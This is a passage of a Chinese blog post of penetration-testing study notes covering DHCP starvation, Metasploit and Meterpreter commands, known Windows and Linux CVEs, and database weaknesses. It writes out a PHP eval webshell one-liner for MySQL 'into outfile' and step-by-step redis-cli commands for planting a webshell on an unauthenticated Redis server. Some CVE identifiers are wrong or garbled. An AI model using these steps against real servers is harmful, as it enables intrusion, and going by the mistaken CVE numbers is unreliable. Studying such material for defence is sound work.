+<li>提供（Offer）：DHCP服务器收到DHCP发现消息后，向设备发送一个DHCP提供消息，包含一个可用的IP地址和其他配置信息。这个消息也是广播到网络上的所有设备。</li>
+<li>请求（Request）：设备收到DHCP提供消息后，会向DHCP服务器发送一个DHCP请求消息，请求分配该IP地址和其他配置信息。该请求消息只会发送给DHCP服务器，而不是广播到整个网络。</li>
+<li>确认（Acknowledge）：DHCP服务器收到DHCP请求消息后，会向设备发送一个DHCP确认消息，确认分配了该IP地址和其他配置信息。此时，设备已经成功获取到了IP地址和其他网络配置信息。</li>
+<li>更新（Renewal）：设备在使用IP地址时，会周期性地向DHCP服务器发送DHCP请求消息，请求更新租约。如果租约即将到期，DHCP服务器会向设备发送DHCP提供消息，要求续约租约。</li>
+<li>释放（Release）：当设备不再需要IP地址时，它可以向DHCP服务器发送DHCP释放消息，释放该IP地址和其他配置信息。</li>
+</ul>
+<p> <strong>DHCP地址耗尽攻击</strong>:</p>
+<p>使用一些工具和技术来模拟大量的设备，向DHCP服务器发送大量的DHCP请求消息，消耗DHCP服务器上可用的IP地址，从而使其无法为其他设备提供IP地址和其他网络配置信息。</p>
+<blockquote>
+<p>  <strong>生活实例：</strong>当我们开启手机热点时，可限制最大连接数，当连接数满时，其他设备就连接不进来。</p>
+</blockquote>
+<blockquote>
+<p>  <strong>防护：</strong>Port Security，限制MAC地址数量，设置端口上允许连接的MAC地址数量</p>
+</blockquote>
+<h2 id="操作系统安全"><a href="#操作系统安全" class="headerlink" title="操作系统安全"></a>操作系统安全</h2><h3 id="1-Metasploit"><a href="#1-Metasploit" class="headerlink" title="1.Metasploit"></a>1.Metasploit</h3><p><strong>基本模块：</strong></p>
+<ul>
+<li>Auxiliary（辅助模块）：包含扫描，fuzz测试，拒绝服务攻击，网络协议欺骗等程序。</li>
+<li>Exploits（攻击模块）：一段程序，运行时会利用目标的安全漏洞进行安全测试。</li>
+<li>Payload（攻击载荷模块）：用于执行恶意操作，如获取目标主机的 shell 或远程访问权限。</li>
+<li>Post（后渗透模块）：拿到权限后，进一步对目标和内外渗透。</li>
+<li>Encodes（编码模块）：用于编码和混淆payload，以绕过防病毒软件和安全策略。</li>
+</ul>
+<p><strong>基本使用命令：</strong></p>
+<ul>
+<li><strong>help</strong>：显示Metasploit命令的帮助文档和说明。</li>
+<li><strong>search</strong>：搜索可用的exploit、payload、auxiliary和post模块。</li>
+<li><strong>use</strong>：选择要使用的exploit、payload、auxiliary或post模块。</li>
+<li><strong>show options</strong>：显示已选择模块的选项和参数。</li>
+<li><strong>set</strong>：设置已选择模块的选项和参数。</li>
+<li><strong>back</strong>：退出当前模块。</li>
+<li><strong>exploit</strong>（或run）：运行已选择的exploit或payload模块。</li>
+<li><strong>sessions</strong>：显示当前已建立的会话列表。</li>
+<li><strong>sessions</strong> <strong>-i</strong>：连接到指定会话编号的主机或会话。</li>
+<li><strong>background</strong>：将当前会话放入后台，返回到Metasploit控制台。</li>
+<li><strong>exit（或quit）</strong>：退出Metasploit控制台。</li>
+</ul>
+<p><strong>Meterpreter：</strong></p>
+<p>基本命令介绍：</p>
+<ul>
+<li>help：显示Meterpreter可用的所有命令列表。</li>
+<li>sysinfo：显示目标系统的操作系统版本、硬件信息等系统信息。</li>
+<li>getuid：显示当前Meterpreter会话的用户ID。</li>
+<li>ps：显示目标系统上运行的所有进程列表。</li>
+<li>ifconfig：列出渗透主机的网络接口。</li>
+<li>kill：杀死指定进程。如：kill <PID>。</li>
+<li>shell：创建一个交互式Shell，可以在目标系统上执行命令和操作。</li>
+<li>upload：上传本地文件到目标系统。如：upload &#x2F;path&#x2F;to&#x2F;local&#x2F;file &#x2F;path&#x2F;to&#x2F;remote&#x2F;file。</li>
+<li>download：从目标系统下载文件到本地系统。如：download &#x2F;path&#x2F;to&#x2F;remote&#x2F;file &#x2F;path&#x2F;to&#x2F;local&#x2F;file。</li>
+<li>execute：在目标系统上执行指定的命令。如：execute -f &#x2F;path&#x2F;to&#x2F;command。</li>
+<li>migrate：将Meterpreter进程转移到目标系统上的另一个进程中，以免被杀死或检测到。</li>
+</ul>
+<h3 id="2-Windous漏洞"><a href="#2-Windous漏洞" class="headerlink" title="2.Windous漏洞"></a>2.Windous漏洞</h3><h4 id="2-1-MS08-067"><a href="#2-1-MS08-067" class="headerlink" title="2.1 MS08-067"></a>2.1 MS08-067</h4><p>漏洞利用的端口是TCP端口139和445。</p>
+<p>影响系统：</p>
+<ul>
+<li>Windows 2000</li>
+<li>Windows XP</li>
+<li>Windows Server 2003</li>
+<li>Windows Vista</li>
+<li>Windows Server 2008</li>
+<li>Windows 7</li>
+</ul>
+<h4 id="2-2-MS17-010（永恒之蓝）"><a href="#2-2-MS17-010（永恒之蓝）" class="headerlink" title="2.2 MS17-010（永恒之蓝）"></a>2.2 MS17-010（永恒之蓝）</h4><p>漏洞利用Windows Server Message Block (SMB)协议，协议使用TCP端口<strong>445</strong>。</p>
+<p>影响系统：</p>
+<ul>
+<li>Windows Vista</li>
+<li>Windows Server 2008</li>
+<li>Windows 7</li>
+<li>Windows Server 2008 R2</li>
+<li>Windows 8.1</li>
+<li>Windows Server 2012 R2</li>
+<li>Windows 10 (包括Windows Server 2016)</li>
+</ul>
+<h4 id="2-3-CVE-2019-0708（BlueKeep）"><a href="#2-3-CVE-2019-0708（BlueKeep）" class="headerlink" title="2.3 CVE-2019-0708（BlueKeep）"></a>2.3 CVE-2019-0708（BlueKeep）</h4><p>利用Windows Remote Desktop Services（RDP）协议，协议使用TCP端口<strong>3389</strong>。</p>
+<p>影响系统：</p>
+<ul>
+<li>Windows 7</li>
+<li>Windows Server 2008 R2</li>
+<li>Windows Server 2008</li>
+<li>Windows XP</li>
+</ul>
+<h3 id="3-Linux漏洞"><a href="#3-Linux漏洞" class="headerlink" title="3.Linux漏洞"></a>3.Linux漏洞</h3><h4 id="3-1-CVE-2017-7494"><a href="#3-1-CVE-2017-7494" class="headerlink" title="3.1 CVE-2017-7494"></a>3.1 CVE-2017-7494</h4><p>一种影响Samba服务器的漏洞（Samba是一个开源软件套件，允许非Windows操作系统与Windows网络共享文件和打印机）。</p>
+<p>漏洞影响<strong>Samba 3.5.0</strong>至<strong>4.6.4</strong>版本，利用的端口是TCP端口<strong>445</strong>。</p>
+<h4 id="3-2-CVE-2016-5196（脏牛Dirty-COW）"><a href="#3-2-CVE-2016-5196（脏牛Dirty-COW）" class="headerlink" title="3.2 CVE-2016-5196（脏牛Dirty COW）"></a>3.2 CVE-2016-5196（脏牛Dirty COW）</h4><p>攻击者可以利用此漏洞在<strong>未经授权</strong>的情况下<strong>提权</strong>，并在受影响的系统上执行任意代码。</p>
+<p>该漏洞影响Linux内核版本<strong>2.6.22</strong>至<strong>4.8</strong>之间的系统。</p>
+<h2 id="Web应用安全"><a href="#Web应用安全" class="headerlink" title="Web应用安全"></a>Web应用安全</h2><p>Web通用漏洞：</p>
+<ul>
+<li>SQL注入</li>
+<li>XSS</li>
+<li>文件上传</li>
+<li>CSRF</li>
+<li>目录穿越</li>
+<li>命令注入</li>
+<li>越权漏洞</li>
+<li>业务逻辑漏洞</li>
+<li>框架漏洞</li>
+</ul>
+<blockquote>
+<p>  详细内容较多，大部分皆已了解，此处联想记忆。</p>
+</blockquote>
+<h2 id="数据库安全"><a href="#数据库安全" class="headerlink" title="数据库安全"></a>数据库安全</h2><p>常见的数据库： MySQL，Oracle，SQL Server，MongoDB等。</p>
+<p>数据库常见漏洞：</p>
+<ul>
+<li>弱口令（暴力破解）</li>
+<li>Web应用安全性不足（SQL注入）</li>
+<li>数据库配置隐患（写文件权限，getshell）</li>
+<li>未授权漏洞（Redis，MongoDB）</li>
+<li>数据库产品本身漏洞</li>
+</ul>
+<h3 id="1-数据库弱口令"><a href="#1-数据库弱口令" class="headerlink" title="1. 数据库弱口令"></a>1. 数据库弱口令</h3><p>运用工具：namp（端口扫描），crunch（密码生成），hydra（暴力破解）</p>
+<h3 id="2-数据库配置隐患"><a href="#2-数据库配置隐患" class="headerlink" title="2. 数据库配置隐患"></a>2. 数据库配置隐患</h3><p>Mysql权限配置-getshell</p>
+<p>利用条件：</p>
+<ul>
+<li><p>已知网站路径（phpinfo），且有写入权限</p>
+</li>
+<li><p>高权限数据库用户</p>
+</li>
+<li><p>load_file()开启，secure_file_priv无限制</p>
+</li>
+</ul>
+<p>利用步骤：</p>
+<ul>
+<li><code>select &quot;&lt;?php @eval($_POST[&#39;key&#39;]);?&gt;&quot; into outfile  &quot;网站路径&quot;</code>。</li>
+<li>蚁剑俩就webshell。</li>
+</ul>
+<h3 id="3-未授权漏洞"><a href="#3-未授权漏洞" class="headerlink" title="3. 未授权漏洞"></a>3. 未授权漏洞</h3><p><strong>Redis-未授权漏洞</strong>：在未授权情况下，利用Redis自身提供的config命令进行getshell。</p>
+<p>利用步骤：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. redis-cli -h [ip]	#客户端连接redis</span><br><span class="line">2. &gt; config set dir /var/www/html	#设置写入目录</span><br><span class="line">3. &gt; config set dbfilename shell.php	#设置写入文件</span><br><span class="line">4. &gt; set webshell &quot;&lt;?php @eval($_POST[&#x27;key&#x27;]);?&gt;&quot;	#以键值对的形式写入一句话木马</span><br><span class="line">5. &gt; save	#保存</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-数据库产品漏洞"><a href="#4-数据库产品漏洞" class="headerlink" title="4. 数据库产品漏洞"></a>4. 数据库产品漏洞</h3><p>Mysql身份认证漏洞CVE-201202122.</p>
+<p>原理：当连接Mysql中，输入的密码会和期望的正确密码比较，由于内部不正确处理导致Mysql也会认为密码是相同的，大约256次能蒙对一次。</p>
+<p>影响：MySQL版本5.1.61、5.5.22和5.6.6之前的所有MariaDB和Mysql版本。</p>
+
+
+
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/02/08/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA(%E5%85%8D%E8%B4%B9%E9%83%A8%E7%BD%B2)/">博客搭建(免费部署)</a></div></section></div>
+
+
+<div class="related-wrap reveal" id="related-posts"></div>
+
+
+
+  <div class='related-wrap md-text reveal' id="comments">
+    <section class='header cmt-title cap theme'>
+      路过，就留下你的足迹吧！
+    </section>
+    <section class='body cmt-body giscus'>
+      
+
+<svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg>
+
+<div id="giscus" data-repo="WenGuiO/BlogState" data-repo-id="R_kgDOI2KBdg" data-category="General" data-category-id="DIC_kwDOI2KBds4CT0UY" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="1" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" data-loading="lazy" crossorigin="anonymous"></div>
+
+    </section>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs14">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags">标签</a><a href="/archives/">归档</a></div><div class="sitemap-group"><span class="fs14">学习</span><a href="/wiki">项目</a><a href="/wiki/tags/%E7%9F%A5%E8%AF%86%E5%BA%93/index.html">笔记</a><a href="/books/">书籍</a></div><div class="sitemap-group"><span class="fs14">关于</span><a href="/about">本站简介</a><a href="/more/">本站动态</a><a target="_blank" rel="noopener" href="https://github.com/WenGuiO">GitHub</a><a target="_blank" rel="noopener" href="https://gitee.com/wenguio">Gitee</a></div><div class="sitemap-group"><span class="fs14">更多</span><a href="/notes">宝站</a><a href="/message/">留言</a><a href="/support/">支持</a><a href="/notes/music/">音乐</a></div></div><div class="text"><p>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+<center>
+</br>
+</br>
+<!--不蒜子计数器-->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!--添加一个访问量-->
+<span>
+  本"<span style="color: rgb(13, 109, 252); font-weight: bold;">页面</ a></span>"访问 
+  <span id="busuanzi_value_page_pv" style="color: rgb(13, 109, 252); font-weight: bold;"></span> 次 | 👀总访问 
+  <span id="busuanzi_value_site_pv" style="color: rgb(13, 109, 252); font-weight: bold;"></span> 次 | 👤总访客 
+  <span id="busuanzi_value_site_uv" style="color: rgb(13, 109, 252); font-weight: bold;"></span> 人
+</span>
+</br>
+</br>
+<script type="text/javascript">
+function show_runtime() {
+    X = new Date("12/26/2022 20:34:01");
+    Y = new Date();
+    T = (Y.getTime() - X.getTime());
+    M = 24 * 60 * 60 * 1000;
+    a = T / M;
+    A = Math.floor(a);
+    b = (a - A) * 24;
+    B = Math.floor(b);
+    c = (b - B) * 60;
+    C = Math.floor((b - B) * 60);
+    D = Math.floor((c - C) * 60);
+    runtime_span.innerHTML = "⏱️本站已运行 " + A + "天" + B + "小时" + C + "分" + D + "秒";
+}
+window.setInterval("show_runtime()", 1000);
+</script>
+<span id="runtime_span"></span>
+</center>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.18.5';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.18.5';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://gcore.jsdelivr.net/npm/jquery@3.6.2/dist/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.css","js":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://gcore.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://gcore.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://gcore.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function loadJS() {
+    const els = document.querySelectorAll("#comments #giscus");
+    if (els.length === 0) return;
+    els.forEach((el, i) => {
+      try {
+        el.innerHTML = '';
+      } catch (error) {
+        console.log(error);
+      }
+      var script = document.createElement('script');
+      script.src = 'https://giscus.app/client.js';
+      script.async = true;
+      for (let key of Object.keys(el.attributes)) {
+        let attr = el.attributes[key];
+        if (['class', 'id'].includes(attr.name) === false) {
+          script.setAttribute(attr.name, attr.value);
+        }
+      }
+      el.appendChild(script);
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    loadJS();
+  });
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
